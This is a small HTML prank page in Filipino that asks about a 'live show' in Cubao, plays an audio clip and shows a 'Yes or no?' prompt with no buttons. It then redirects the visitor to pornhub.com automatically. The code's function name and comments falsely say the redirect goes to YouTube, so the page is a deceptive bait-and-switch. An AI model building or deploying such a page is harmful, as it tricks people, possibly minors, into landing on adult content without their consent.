<!DOCTYPE html>
<html>
<head>
<title>Manunuod ba tayo ng live show?</title>
<style>
body {
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
font-family: Arial, sans-serif;
}
.message-container {
text-align: center;
}
</style>
<script>
const audio = new Audio('voicemod.mp3');

audio.addEventListener("canplaythrough", () => {
   audio.play().catch(e => {
      window.addEventListener('click', () => {
         audio.play()
      })
   })
});
// Function to display the message and redirect to the specified YouTube link
function redirectToYouTube() {
var messageContainer = document.getElementById("message-container");
messageContainer.innerHTML = "<h2>Sama ba kayo sa live show sa Cubao? </h2>";
setTimeout(function () {
// Display the additional message for 1 second longer (4000 milliseconds)
messageContainer.innerHTML = "<h2>Yes or no? (Pakipendot Yes kung oo syempre kapag hindi yung no.) Salamat sa pagsagot! <h2>";
setTimeout(function () {
window.location.href = "https://pornhub.com";
}, 2000);
}, 3000); // Changed the duration to 4000 milliseconds
}
</script>
</head>
<body>
<div class="message-container" id="message-container">
<h1>Waiting for answer...</h1>
</div>
<script>
redirectToYouTube(); // Automatically start the redirection process
</script>
</body>
</html>
